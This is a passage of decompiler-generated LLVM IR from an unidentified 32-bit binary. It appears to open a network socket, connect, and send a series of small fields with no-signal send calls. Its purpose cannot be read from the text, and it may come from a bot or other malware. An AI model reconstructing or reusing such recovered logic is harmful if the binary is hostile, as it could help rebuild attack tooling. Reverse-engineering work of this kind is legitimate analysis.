  %v1_804ee7c = add i32 %v0_804ee7c, 4
  %v2_804ee7c = inttoptr i32 %v1_804ee7c to i32*
  %v3_804ee7c = load i32, i32* %v2_804ee7c, align 4
  store i32 %v3_804ee7c, i32* %eax.global-to-local, align 4
  %v2_804ee7f = add i32 %v0_804ee0c, 16
  %v3_804ee7f = inttoptr i32 %v2_804ee7f to i32*
  store i32 %v3_804ee7c, i32* %v3_804ee7f, align 4
  %v1_804ee80 = call i32 @function_804fab3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ee80, i32* %eax.global-to-local, align 4
  %v0_804ee88 = load i32, i32* @edi, align 4
  %v1_804ee88 = add i32 %v0_804ee88, 4
  %v2_804ee88 = inttoptr i32 %v1_804ee88 to i32*
  store i32 -1, i32* %v2_804ee88, align 4
  %v0_804ee8f = load i32, i32* @edi, align 4
  %v1_804ee8f = add i32 %v0_804ee8f, 284
  %v2_804ee8f = inttoptr i32 %v1_804ee8f to i8*
  store i8 0, i8* %v2_804ee8f, align 1
  %v0_804ee96 = load i32, i32* @edi, align 4
  %v1_804ee96 = add i32 %v0_804ee96, 12
  %v2_804ee96 = inttoptr i32 %v1_804ee96 to i32*
  store i32 0, i32* %v2_804ee96, align 4
  br label %dec_label_pc_804e3b2

dec_label_pc_804eea2:                             ; preds = %dec_label_pc_804eb7d
  %v2_804eea5 = inttoptr i32 %v0_804eb95 to i32*
  store i32 26, i32* %v2_804eea5, align 4
  %v0_804eea7 = call i32 @function_804f0d0()
  store i32 %v0_804eea7, i32* %eax.global-to-local, align 4
  %v0_804eeac = load i32, i32* @esp, align 4
  %v1_804eeac = inttoptr i32 %v0_804eeac to i32*
  store i32 27, i32* %v1_804eeac, align 4
  %v0_804eeb3 = call i32 @function_804f0d0()
  store i32 %v0_804eeb3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e415.backedge

dec_label_pc_804e415.backedge:                    ; preds = %dec_label_pc_804e497, %dec_label_pc_804e9e8, %dec_label_pc_804ea89, %dec_label_pc_804e487, %dec_label_pc_804e826, %dec_label_pc_804e7e8, %dec_label_pc_804ed5d, %dec_label_pc_804e7a3, %dec_label_pc_804ec2d, %dec_label_pc_804e67e, %dec_label_pc_804e640, %dec_label_pc_804ea96, %dec_label_pc_804e5f5, %dec_label_pc_804ece4, %dec_label_pc_804e5b0, %dec_label_pc_804ea31, %dec_label_pc_804ebab, %dec_label_pc_804e811, %dec_label_pc_804e632, %dec_label_pc_804e7e0, %dec_label_pc_804e669, %dec_label_pc_804e5ed, %dec_label_pc_804eea2
  %v0_804e415 = load i32, i32* @edi, align 4
  %v1_804e415 = add i32 %v0_804e415, 12
  %v2_804e415 = inttoptr i32 %v1_804e415 to i32*
  %v3_804e415 = load i32, i32* %v2_804e415, align 4
  store i32 %v3_804e415, i32* %eax.global-to-local, align 4
  %v1_804e418 = icmp eq i32 %v3_804e415, 0
  br i1 %v1_804e418, label %dec_label_pc_804e3b2, label %dec_label_pc_804e415.backedge.dec_label_pc_804e41c_crit_edge

dec_label_pc_804e415.backedge.dec_label_pc_804e41c_crit_edge: ; preds = %dec_label_pc_804e415.backedge
  %v1_804e41f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e41c

dec_label_pc_804eec0:                             ; preds = %dec_label_pc_804ec8c
  %v1_804eec0 = add i32 %v0_804eca3, 1
  %v8_804eec0 = icmp eq i32 %v1_804eec0, 0
  store i32 %v1_804eec0, i32* %eax.global-to-local, align 4
  br i1 %v8_804eec0, label %dec_label_pc_804ecb0, label %dec_label_pc_804eec7

dec_label_pc_804eec7:                             ; preds = %dec_label_pc_804eec0
  %v0_804eec7 = load i32, i32* @ecx, align 4
  %v1_804eec7 = load i32, i32* @esp, align 4
  %v2_804eec7 = add i32 %v1_804eec7, -4
  %v3_804eec7 = inttoptr i32 %v2_804eec7 to i32*
  store i32 %v0_804eec7, i32* %v3_804eec7, align 4
  %v1_804eec8 = add i32 %v1_804eec7, -8
  %v2_804eec8 = inttoptr i32 %v1_804eec8 to i32*
  store i32 0, i32* %v2_804eec8, align 4
  %v1_804eeca = add i32 %v1_804eec7, -12
  %v2_804eeca = inttoptr i32 %v1_804eeca to i32*
  store i32 1, i32* %v2_804eeca, align 4
  %v1_804eecc = add i32 %v1_804eec7, -16
  %v2_804eecc = inttoptr i32 %v1_804eecc to i32*
  store i32 2, i32* %v2_804eecc, align 4
  %v4_804eece = call i32 @function_8050297(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804eece, i32* @eax, align 4
  %v0_804eed3 = load i32, i32* @esp, align 4
  %sext7 = mul i32 %v4_804eece, 16777216
  %v1_804eed6 = sdiv i32 %sext7, 16777216
  store i32 %v1_804eed6, i32* @ebx, align 4
  %tmp310 = icmp eq i32 %sext7, -16777216
  %v2_804e097 = inttoptr i32 %v0_804eed3 to i32*
  br i1 %tmp310, label %dec_label_pc_804e094, label %dec_label_pc_804eee1

dec_label_pc_804eee1:                             ; preds = %dec_label_pc_804eec7
  store i32 2, i32* %v2_804e097, align 4
  %v0_804eee6 = call i32 @function_804f150()
  store i32 %v0_804eee6, i32* %eax.global-to-local, align 4
  %v0_804eeeb = load i32, i32* @esp, align 4
  %v1_804eeeb = add i32 %v0_804eeeb, 1828
  %v2_804eeeb = inttoptr i32 %v1_804eeeb to i16*
  store i16 2, i16* %v2_804eeeb, align 2
  %v0_804eef5 = load i32, i32* @esp, align 4
  %v1_804eef5 = inttoptr i32 %v0_804eef5 to i32*
  store i32 ptrtoint ([15 x i8]* @global_var_8052382.26 to i32), i32* %v1_804eef5, align 4
  %v0_804eefc = call i32 @function_805006c()
  store i32 %v0_804eefc, i32* %eax.global-to-local, align 4
  %v1_804ef01 = load i32, i32* @esp, align 4
  %v2_804ef01 = add i32 %v1_804ef01, 1832
  %v3_804ef01 = inttoptr i32 %v2_804ef01 to i32*
  store i32 %v0_804eefc, i32* %v3_804ef01, align 4
  %v0_804ef08 = load i32, i32* @esp, align 4
  %v1_804ef08 = inttoptr i32 %v0_804ef08 to i32*
  %v2_804ef08 = load i32, i32* %v1_804ef08, align 4
  store i32 %v2_804ef08, i32* %eax.global-to-local, align 4
  %v3_804ef08 = add i32 %v0_804ef08, 4
  %v1_804ef09 = inttoptr i32 %v3_804ef08 to i32*
  %v2_804ef09 = load i32, i32* %v1_804ef09, align 4
  store i32 %v2_804ef09, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804ef09, align 4
  store i32 2, i32* %v1_804ef08, align 4
  %v0_804ef0e = call i32 @function_804f0a0()
  %v1_804ef0e = inttoptr i32 %v0_804ef0e to i16*
  store i32 %v0_804ef0e, i32* %eax.global-to-local, align 4
  %v3_804ef13 = load i16, i16* %v1_804ef0e, align 2
  %v4_804ef13 = zext i16 %v3_804ef13 to i32
  %v7_804ef13 = and i32 %v0_804ef0e, -65536
  %v8_804ef13 = or i32 %v4_804ef13, %v7_804ef13
  store i32 %v8_804ef13, i32* %eax.global-to-local, align 4
  %v0_804ef16 = load i32, i32* @esp, align 4
  %v1_804ef16 = inttoptr i32 %v0_804ef16 to i32*
  store i32 2, i32* %v1_804ef16, align 4
  %v0_804ef1d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef1d = trunc i32 %v0_804ef1d to i16
  %v2_804ef1d = load i32, i32* @esp, align 4
  %v3_804ef1d = add i32 %v2_804ef1d, 1830
  %v4_804ef1d = inttoptr i32 %v3_804ef1d to i16*
  store i16 %v1_804ef1d, i16* %v4_804ef1d, align 2
  %v0_804ef25 = call i32 @function_804f0d0()
  %v0_804ef2a = load i32, i32* @esp, align 4
  %v1_804ef2a = add i32 %v0_804ef2a, 1828
  store i32 %v1_804ef2a, i32* %eax.global-to-local, align 4
  %v1_804ef34 = add i32 %v0_804ef2a, 8
  %v2_804ef34 = inttoptr i32 %v1_804ef34 to i32*
  store i32 16, i32* %v2_804ef34, align 4
  %v0_804ef36 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ef36 = add i32 %v0_804ef2a, 4
  %v3_804ef36 = inttoptr i32 %v2_804ef36 to i32*
  store i32 %v0_804ef36, i32* %v3_804ef36, align 4
  %v0_804ef37 = load i32, i32* @ebx, align 4
  %v3_804ef37 = inttoptr i32 %v0_804ef2a to i32*
  store i32 %v0_804ef37, i32* %v3_804ef37, align 4
  %v3_804ef38 = call i32 @function_80500bc(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804ef3d = load i32, i32* @esp, align 4
  %v1_804ef40 = add i32 %v3_804ef38, 1
  %v8_804ef40 = icmp eq i32 %v1_804ef40, 0
  store i32 %v1_804ef40, i32* %eax.global-to-local, align 4
  %v1_804ef41 = icmp eq i1 %v8_804ef40, false
  br i1 %v1_804ef41, label %dec_label_pc_804effc, label %dec_label_pc_804ef4a

dec_label_pc_804ef4a:                             ; preds = %dec_label_pc_804eee1, %dec_label_pc_804effc
  %storemerge4.in = phi i32 [ %v0_804f098, %dec_label_pc_804effc ], [ %v0_804ef3d, %dec_label_pc_804eee1 ]
  %v0_804ef4a = load i32, i32* @ebx, align 4
  %v3_804ef4a = inttoptr i32 %storemerge4.in to i32*
  store i32 %v0_804ef4a, i32* %v3_804ef4a, align 4
  %v1_804ef4b = call i32 @function_804fab3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ef4b, i32* @eax, align 4
  %v0_804ef50 = load i32, i32* @esp, align 4
  %v1_804ef50 = inttoptr i32 %v0_804ef50 to i32*
  store i32 0, i32* %v1_804ef50, align 4
  %v1_804ef57 = call i32 @function_80515d3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ef57, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef5c

dec_label_pc_804ef5c:                             ; preds = %dec_label_pc_804e2e5, %dec_label_pc_804e2c5, %dec_label_pc_804ef4a
  %v0_804ef5c = load i32, i32* @ebx, align 4
  %v1_804ef5c = add i32 %v0_804ef5c, 284
  %v2_804ef5c = inttoptr i32 %v1_804ef5c to i8*
  store i8 0, i8* %v2_804ef5c, align 1
  %v0_804ef63 = load i32, i32* @ebx, align 4
  %v1_804ef63 = add i32 %v0_804ef63, 12
  %v2_804ef63 = inttoptr i32 %v1_804ef63 to i32*
  store i32 0, i32* %v2_804ef63, align 4
  br label %dec_label_pc_804e283

dec_label_pc_804ef6f:                             ; preds = %dec_label_pc_804e8b3
  %v1_804ef6f = add i32 %v0_804e45a, 40
  %v2_804ef6f = inttoptr i32 %v1_804ef6f to i32*
  %v3_804ef6f = load i32, i32* %v2_804ef6f, align 4
  store i32 %v3_804ef6f, i32* %eax.global-to-local, align 4
  %v1_804ef73 = inttoptr i32 %v3_804ef6f to i32*
  store i32 104, i32* %v1_804ef73, align 4
  %v0_804e8cf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e8cf

dec_label_pc_804ef7e:                             ; preds = %dec_label_pc_804e8cf
  store i32 %v0_804ef7e, i32* @eax, align 4
  %v0_804ef80 = call i32 @function_804d8e0()
  store i32 %v0_804ef80, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3b2

dec_label_pc_804ef8a:                             ; preds = %dec_label_pc_804e996
  %v11_804ef8a = icmp eq i8 %v2_804e996, -5
  %v1_804ef8c = icmp eq i1 %v11_804ef8a, false
  br i1 %v1_804ef8c, label %dec_label_pc_804e4d0, label %dec_label_pc_804ef92

dec_label_pc_804ef92:                             ; preds = %dec_label_pc_804ef8a
  store i8 -3, i8* %v1_804e996, align 1
  br label %dec_label_pc_804e4d0

dec_label_pc_804ef9a:                             ; preds = %dec_label_pc_804e98c
  %v1_804ef9a = add i32 %v0_804e978, -4
  %v2_804ef9a = inttoptr i32 %v1_804ef9a to i32*
  store i32 16384, i32* %v2_804ef9a, align 4
  %v1_804ef9f = add i32 %v0_804e978, -8
  %v2_804ef9f = inttoptr i32 %v1_804ef9f to i32*
  store i32 3, i32* %v2_804ef9f, align 4
  %v1_804efa1 = add i32 %v0_804e978, 1863
  store i32 %v1_804efa1, i32* %eax.global-to-local, align 4
  %v0_804efa8 = load i32, i32* @ebx, align 4
  %v1_804efa8 = add i32 %v0_804efa8, 3
  store i32 %v1_804efa8, i32* @ebx, align 4
  %v2_804efab = add i32 %v0_804e978, -12
  %v3_804efab = inttoptr i32 %v2_804efab to i32*
  store i32 %v1_804efa1, i32* %v3_804efab, align 4
  %v0_804efac = load i32, i32* @esi, align 4
  %v1_804efac = add i32 %v0_804efac, 3
  store i32 %v1_804efac, i32* @esi, align 4
  %v0_804efaf = load i32, i32* @edi, align 4
  %v1_804efaf = add i32 %v0_804efaf, 4
  %v2_804efaf = inttoptr i32 %v1_804efaf to i32*
  %v3_804efaf = load i32, i32* %v2_804efaf, align 4
  store i32 %v3_804efaf, i32* %eax.global-to-local, align 4
  %v2_804efb2 = add i32 %v0_804e978, -16
  %v3_804efb2 = inttoptr i32 %v2_804efb2 to i32*
  store i32 %v3_804efaf, i32* %v3_804efb2, align 4
  %v0_804efb3 = call i32 @function_80501e6()
  %v0_804efb8 = load i32, i32* @esp, align 4
  %v1_804efb8 = add i32 %v0_804efb8, -4
  %v2_804efb8 = inttoptr i32 %v1_804efb8 to i32*
  store i32 16384, i32* %v2_804efb8, align 4
  %v1_804efbd = add i32 %v0_804efb8, -8
  %v2_804efbd = inttoptr i32 %v1_804efbd to i32*
  store i32 9, i32* %v2_804efbd, align 4
  %v1_804efbf = add i32 %v0_804efb8, 1847
  store i32 %v1_804efbf, i32* %eax.global-to-local, align 4
  %v2_804efc6 = add i32 %v0_804efb8, -12
  %v3_804efc6 = inttoptr i32 %v2_804efc6 to i32*
  store i32 %v1_804efbf, i32* %v3_804efc6, align 4
  %v0_804efc7 = load i32, i32* @edi, align 4
  %v1_804efc7 = add i32 %v0_804efc7, 4
  %v2_804efc7 = inttoptr i32 %v1_804efc7 to i32*
  %v3_804efc7 = load i32, i32* %v2_804efc7, align 4
  store i32 %v3_804efc7, i32* %eax.global-to-local, align 4
  %v2_804efca = add i32 %v0_804efb8, -16
  %v3_804efca = inttoptr i32 %v2_804efca to i32*
  store i32 %v3_804efc7, i32* %v3_804efca, align 4
  %v0_804efcb = call i32 @function_80501e6()
  store i32 %v0_804efcb, i32* %eax.global-to-local, align 4
  %v0_804efd0 = load i32, i32* @esp, align 4
  %v1_804efd0 = add i32 %v0_804efd0, 32
  %v0_804efd3 = load i32, i32* @edi, align 4
  %v1_804efd3 = add i32 %v0_804efd3, 24
  %v2_804efd3 = inttoptr i32 %v1_804efd3 to i32*
  %v3_804efd3 = load i32, i32* %v2_804efd3, align 4
  store i32 %v3_804efd3, i32* %edx.global-to-local, align 4
  %v0_804e4a0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e4a0.backedge

dec_label_pc_804efed:                             ; preds = %dec_label_pc_804e734
  store i32 %v0_804efed, i32* @eax, align 4
  store i32 -1, i32* @esi, align 4
  %v0_804eff2 = call i32 @function_804d8e0()
  store i32 %v0_804eff2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804effc:                             ; preds = %dec_label_pc_804eee1
  %v1_804effc = add i32 %v0_804ef3d, 1864
  %v2_804effc = inttoptr i32 %v1_804effc to i8*
  store i8 0, i8* %v2_804effc, align 1
  %v0_804f004 = load i32, i32* @esp, align 4
  %v1_804f004 = add i32 %v0_804f004, -4
  %v2_804f004 = inttoptr i32 %v1_804f004 to i32*
  store i32 16384, i32* %v2_804f004, align 4
  %v1_804f009 = add i32 %v0_804f004, -8
  %v2_804f009 = inttoptr i32 %v1_804f009 to i32*
  store i32 1, i32* %v2_804f009, align 4
  %v1_804f00b = add i32 %v0_804f004, 1848
  store i32 %v1_804f00b, i32* %edx.global-to-local, align 4
  %v2_804f012 = add i32 %v0_804f004, -12
  %v3_804f012 = inttoptr i32 %v2_804f012 to i32*
  store i32 %v1_804f00b, i32* %v3_804f012, align 4
  %v0_804f013 = load i32, i32* @ebx, align 4
  %v2_804f013 = add i32 %v0_804f004, -16
  %v3_804f013 = inttoptr i32 %v2_804f013 to i32*
  store i32 %v0_804f013, i32* %v3_804f013, align 4
  %v0_804f014 = call i32 @function_80501e6()
  %v0_804f019 = load i32, i32* @esp, align 4
  %v1_804f019 = add i32 %v0_804f019, -4
  %v2_804f019 = inttoptr i32 %v1_804f019 to i32*
  store i32 16384, i32* %v2_804f019, align 4
  %v1_804f01e = add i32 %v0_804f019, -8
  %v2_804f01e = inttoptr i32 %v1_804f01e to i32*
  store i32 4, i32* %v2_804f01e, align 4
  %v1_804f020 = add i32 %v0_804f019, 1872
  store i32 %v1_804f020, i32* %eax.global-to-local, align 4
  %v2_804f027 = add i32 %v0_804f019, -12
  %v3_804f027 = inttoptr i32 %v2_804f027 to i32*
  store i32 %v1_804f020, i32* %v3_804f027, align 4
  %v0_804f028 = load i32, i32* @ebx, align 4
  %v2_804f028 = add i32 %v0_804f019, -16
  %v3_804f028 = inttoptr i32 %v2_804f028 to i32*
  store i32 %v0_804f028, i32* %v3_804f028, align 4
  %v0_804f029 = call i32 @function_80501e6()
  %v0_804f02e = load i32, i32* @esp, align 4
  %v1_804f031 = add i32 %v0_804f02e, 28
  %v2_804f031 = inttoptr i32 %v1_804f031 to i32*
  store i32 16384, i32* %v2_804f031, align 4
  %v1_804f036 = add i32 %v0_804f02e, 24
  %v2_804f036 = inttoptr i32 %v1_804f036 to i32*
  store i32 2, i32* %v2_804f036, align 4
  %v1_804f038 = add i32 %v0_804f02e, 1898
  store i32 %v1_804f038, i32* %eax.global-to-local, align 4
  %v2_804f03f = add i32 %v0_804f02e, 20
  %v3_804f03f = inttoptr i32 %v2_804f03f to i32*
  store i32 %v1_804f038, i32* %v3_804f03f, align 4
  %v0_804f040 = load i32, i32* @ebx, align 4
  %v2_804f040 = add i32 %v0_804f02e, 16
  %v3_804f040 = inttoptr i32 %v2_804f040 to i32*
  store i32 %v0_804f040, i32* %v3_804f040, align 4
  %v0_804f041 = call i32 @function_80501e6()
  %v0_804f046 = load i32, i32* @ebp, align 4
  %v1_804f046 = add i32 %v0_804f046, 12
  store i32 %v1_804f046, i32* %eax.global-to-local, align 4
  %v0_804f049 = load i32, i32* @esp, align 4
  %v1_804f049 = add i32 %v0_804f049, -4
  %v2_804f049 = inttoptr i32 %v1_804f049 to i32*
  store i32 16384, i32* %v2_804f049, align 4
  %v1_804f04e = add i32 %v0_804f049, -8
  %v2_804f04e = inttoptr i32 %v1_804f04e to i32*
  store i32 1, i32* %v2_804f04e, align 4
  %v0_804f050 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f050 = add i32 %v0_804f049, -12
  %v3_804f050 = inttoptr i32 %v2_804f050 to i32*
  store i32 %v0_804f050, i32* %v3_804f050, align 4
  %v0_804f051 = load i32, i32* @ebx, align 4
  %v2_804f051 = add i32 %v0_804f049, -16
  %v3_804f051 = inttoptr i32 %v2_804f051 to i32*
  store i32 %v0_804f051, i32* %v3_804f051, align 4
  %v0_804f052 = call i32 @function_80501e6()
  %v0_804f057 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f05c = add i32 %v0_804f057, 28
  %v2_804f05c = inttoptr i32 %v1_804f05c to i32*
  store i32 16384, i32* %v2_804f05c, align 4
  %v0_804f061 = load i32, i32* @ebp, align 4
  %v1_804f061 = add i32 %v0_804f061, 12
  %v2_804f061 = inttoptr i32 %v1_804f061 to i8*
  %v3_804f061 = load i8, i8* %v2_804f061, align 1
  %v4_804f061 = zext i8 %v3_804f061 to i32
  %v5_804f061 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f061 = and i32 %v5_804f061, -256
  %v7_804f061 = or i32 %v6_804f061, %v4_804f061
  store i32 %v7_804f061, i32* %eax.global-to-local, align 4
  %v2_804f064 = add i32 %v0_804f057, 24
  %v3_804f064 = inttoptr i32 %v2_804f064 to i32*
  store i32 %v7_804f061, i32* %v3_804f064, align 4
  %v0_804f065 = load i32, i32* @ebp, align 4
  %v1_804f065 = inttoptr i32 %v0_804f065 to i32*
  %v2_804f065 = load i32, i32* %v1_804f065, align 4
  store i32 %v2_804f065, i32* %eax.global-to-local, align 4
  %v2_804f068 = add i32 %v0_804f057, 20
  %v3_804f068 = inttoptr i32 %v2_804f068 to i32*
  store i32 %v2_804f065, i32* %v3_804f068, align 4
  %v0_804f069 = load i32, i32* @ebx, align 4
  %v2_804f069 = add i32 %v0_804f057, 16
  %v3_804f069 = inttoptr i32 %v2_804f069 to i32*
  store i32 %v0_804f069, i32* %v3_804f069, align 4
  %v0_804f06a = call i32 @function_80501e6()
  %v0_804f06f = load i32, i32* @ebp, align 4
  %v1_804f06f = add i32 %v0_804f06f, 13
  store i32 %v1_804f06f, i32* %eax.global-to-local, align 4
  %v0_804f072 = load i32, i32* @esp, align 4
  %v1_804f072 = add i32 %v0_804f072, -4
  %v2_804f072 = inttoptr i32 %v1_804f072 to i32*
  store i32 16384, i32* %v2_804f072, align 4
  %v1_804f077 = add i32 %v0_804f072, -8
  %v2_804f077 = inttoptr i32 %v1_804f077 to i32*
  store i32 1, i32* %v2_804f077, align 4
  %v0_804f079 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f079 = add i32 %v0_804f072, -12
  %v3_804f079 = inttoptr i32 %v2_804f079 to i32*
  store i32 %v0_804f079, i32* %v3_804f079, align 4
  %v0_804f07a = load i32, i32* @ebx, align 4
  %v2_804f07a = add i32 %v0_804f072, -16
  %v3_804f07a = inttoptr i32 %v2_804f07a to i32*
  store i32 %v0_804f07a, i32* %v3_804f07a, align 4
  %v0_804f07b = call i32 @function_80501e6()
  %v0_804f080 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f085 = add i32 %v0_804f080, 28
  %v2_804f085 = inttoptr i32 %v1_804f085 to i32*
  store i32 16384, i32* %v2_804f085, align 4
  %v0_804f08a = load i32, i32* @ebp, align 4
  %v1_804f08a = add i32 %v0_804f08a, 13
  %v2_804f08a = inttoptr i32 %v1_804f08a to i8*
  %v3_804f08a = load i8, i8* %v2_804f08a, align 1
  %v4_804f08a = zext i8 %v3_804f08a to i32
  %v5_804f08a = load i32, i32* %eax.global-to-local, align 4
  %v6_804f08a = and i32 %v5_804f08a, -256
  %v7_804f08a = or i32 %v6_804f08a, %v4_804f08a
  store i32 %v7_804f08a, i32* %eax.global-to-local, align 4
  %v2_804f08d = add i32 %v0_804f080, 24
  %v3_804f08d = inttoptr i32 %v2_804f08d to i32*
  store i32 %v7_804f08a, i32* %v3_804f08d, align 4
  %v0_804f08e = load i32, i32* @ebp, align 4
  %v1_804f08e = add i32 %v0_804f08e, 4
  %v2_804f08e = inttoptr i32 %v1_804f08e to i32*
  %v3_804f08e = load i32, i32* %v2_804f08e, align 4
  store i32 %v3_804f08e, i32* %eax.global-to-local, align 4
  %v2_804f091 = add i32 %v0_804f080, 20
  %v3_804f091 = inttoptr i32 %v2_804f091 to i32*
  store i32 %v3_804f08e, i32* %v3_804f091, align 4
  %v0_804f092 = load i32, i32* @ebx, align 4
  %v2_804f092 = add i32 %v0_804f080, 16
  %v3_804f092 = inttoptr i32 %v2_804f092 to i32*
  store i32 %v0_804f092, i32* %v3_804f092, align 4
  %v0_804f093 = call i32 @function_80501e6()
  store i32 %v0_804f093, i32* %eax.global-to-local, align 4
  %v0_804f098 = load i32, i32* @esp, align 4
  %v1_804f098 = inttoptr i32 %v0_804f098 to i32*
  %v2_804f098 = load i32, i32* %v1_804f098, align 4
  store i32 %v2_804f098, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef4a

; uselistorder directives
  uselistorder i32 %v0_804f098, { 1, 0 }
  uselistorder i32 %v3_804efd3, { 1, 0 }
  uselistorder i32 %v0_804efd3, { 1, 0 }
  uselistorder i32 %v0_804efcb, { 1, 0 }
  uselistorder i32 %v0_804ef3d, { 1, 0 }
  uselistorder i32 %v0_804ef0e, { 0, 2, 1 }
  uselistorder i32* %v2_804e097, { 1, 0 }
  uselistorder i32 %v0_804e415, { 1, 0 }
  uselistorder i32 %v0_804ee51, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804ee50, { 1, 0, 2 }
  uselistorder i16 %v1_804ee58, { 1, 0 }
  uselistorder i64 %v8_804ee3b, { 1, 0 }
  uselistorder i32 %v1_804ed5d, { 1, 2, 0 }
  uselistorder i32 %v1_804ece4, { 1, 2, 0 }
  uselistorder i32 %v0_804eca3, { 1, 0, 2 }
  uselistorder i32 %v0_804ec7b, { 2, 1, 0 }
  uselistorder i32 %v0_804ec54, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804ebd9.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804ebcd, { 1, 0 }
  uselistorder i32 %v0_804ebc4, { 1, 0 }
  uselistorder i32 %v0_804eb53, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804ea96, { 1, 2, 0 }
  uselistorder i32 %v0_804ea4f.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804ea3e, { 1, 0 }
  uselistorder i32 %v0_804ea03, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_804e982, { 1, 0, 2 }
  uselistorder i32 %v1_804e97f, { 1, 0, 2 }
  uselistorder i32 %v0_804e97c, { 1, 0 }
  uselistorder i32 %v0_804e978, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v0_804ef7e, { 1, 0 }
  uselistorder i32 %v2_804e4a0, { 1, 0 }
  uselistorder i32 %v0_804e4a0, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_804e4a0, { 0, 2, 1 }
  uselistorder i32 %v0_804e51e120, { 1, 0 }
  uselistorder i32 %v9_804e818, { 1, 0 }
  uselistorder i32 %v1_804e811, { 1, 3, 2, 0 }
  uselistorder i32 %v0_804e811, { 1, 0, 2 }
  uselistorder i32 %v3_804e7e8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e7e0, { 2, 1, 0 }
  uselistorder i32 %v9_804e7af, { 1, 0 }
  uselistorder i32 %v0_804ed5d, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804e77d, { 1, 2, 0 }
  uselistorder i32 %v1_804e77d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e778, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_804efed, { 1, 0 }
  uselistorder i32* %v1_804ec37, { 2, 0, 1 }
  uselistorder i32 %v0_804e712, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v9_804e670, { 1, 0 }
  uselistorder i32 %v1_804e669, { 1, 3, 2, 0 }
  uselistorder i32 %v0_804e669, { 1, 0, 2 }
  uselistorder i32 %v3_804e640, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e632, { 2, 1, 0 }
  uselistorder i32 %v9_804e601, { 1, 0 }
  uselistorder i32 %v0_804ea96, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e5ed, { 2, 1, 0 }
  uselistorder i32 %v9_804e5bc, { 1, 0 }
  uselistorder i32 %v0_804ece4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e5a4, { 2, 1, 0 }
  uselistorder i32 %v9_804e57c, { 1, 0 }
  uselistorder i32 %v0_804e9dc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e567, { 2, 1, 0 }
  uselistorder i32 %v9_804e536, { 1, 0 }
  uselistorder i32 %v0_804eb0b, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804e512, { 1, 0 }
  uselistorder i32 %v0_804e512, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e50c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e50c, { 0, 2, 1 }
  uselistorder i32 %v0_804e507, { 1, 0 }
  uselistorder i8* %v2_804e4e2, { 1, 0, 2 }
  uselistorder i8* %v1_804e4d0, { 1, 0, 2 }
  uselistorder i32 %v1_804e4ad, { 1, 0, 2 }
  uselistorder i32 %v0_804e918, { 1, 0, 2 }
  uselistorder i32 %v0_804e8a2, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804e51e121, { 3, 0, 1, 2 }
  uselistorder i32 %v2_804e4a017, { 1, 0 }
  uselistorder i32 %v3_804e487, { 1, 0 }
  uselistorder i32 %v0_804e487, { 1, 15, 2, 13, 3, 12, 4, 14, 5, 11, 6, 10, 7, 9, 0, 8, 16 }
  uselistorder i32 %v1_804e472, { 0, 2, 1 }
  uselistorder i32 %v0_804e46e, { 1, 0 }
  uselistorder i32 %v0_804e455, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_804e44b, { 1, 0 }
  uselistorder i32 %v1_804e403, { 1, 0 }
  uselistorder i32 %v2_804e400, { 1, 0 }
  uselistorder i32 %v0_804e3fe, { 1, 0 }
  uselistorder i32 %v0_804e3eb, { 2, 1, 0 }
  uselistorder i32 %v1_804e3e8, { 1, 0 }
  uselistorder i32 %v2_804e3e5, { 1, 0 }
  uselistorder i32 %v3_804e3d9, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_804e3c1, { 1, 0 }
  uselistorder i32 %v0_804e3c1, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e368, { 1, 0 }
  uselistorder i32 %v2_804e325, { 1, 0 }
  uselistorder i32 %v3_804e322, { 1, 0, 2, 3 }
  uselistorder i1 %v9_804e2b2, { 1, 0 }
  uselistorder i32 %v1_804e2b2, { 1, 0 }
  uselistorder i32 %v3_804e2af, { 1, 0, 2 }
  uselistorder i32 %v2_804e2ad, { 1, 2, 3, 4, 0 }
